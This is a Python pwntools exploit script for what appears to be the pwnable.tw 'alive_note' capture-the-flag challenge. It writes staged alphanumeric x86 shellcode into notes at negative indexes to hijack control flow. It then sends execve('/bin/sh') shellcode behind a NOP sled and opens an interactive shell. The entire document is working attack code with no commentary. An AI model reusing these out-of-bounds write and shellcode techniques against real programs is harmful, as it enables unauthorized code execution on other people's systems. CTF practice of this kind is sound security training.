from pwn import *
io=process("./alive_note")
#io=remote("chall.pwnable.tw",10300)
def add(index,name):
    io.sendlineafter("Your choice :","1")
    io.sendlineafter("Index :",str(index))
    io.sendlineafter("Name :",name)

def view(index):
    io.sendlineafter("Your choice :","2")
    io.sendlineafter("Index :",str(index))

def delete(index):
    io.sendlineafter("Your choice :","3")
    io.sendlineafter("Index :",str(index))

def skip():
    add(-30,"aaaaaaaa")
    add(-31,"aaaaaaaa")
    add(-32,"aaaaaaaa")  # aa1u8

# 49 ^ 106 //pop ebx

shell=asm("""
          push eax
          push 0x61
          pop eax
          xor al,0x61
""")
shell+="t8"

add(-27,shell)
print shell
skip()

shell=asm("""
          dec eax
          xor ax,0x4f65
          push eax
""")
shell+="u8"
add(1,shell)
skip()
print shell

shell=asm("""
          pop eax
          xor ax,0x3057
          pop edx

""")
shell+="u8"

add(2,shell)
print shell
skip()


shell=asm("""
          pop ecx
          pop ecx
          push 0x61
          pop edx
          push edx
""")
shell+="u8"

add(3,shell)
print shell
skip()


shell=asm("""
          xor word ptr[ecx+67],ax
          push 100
""")
shell+="u8"

add(4,shell)
print shell
skip()


shell=asm("""
          pop eax
          xor al,103
""")

add(5,shell)
print shell
skip()


#gdb.attach(io)
delete(4)

shellcode="\x90"*0x46+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b1\xd21\xc9\xcd\x80"

io.sendline(shellcode)

io.interactive()
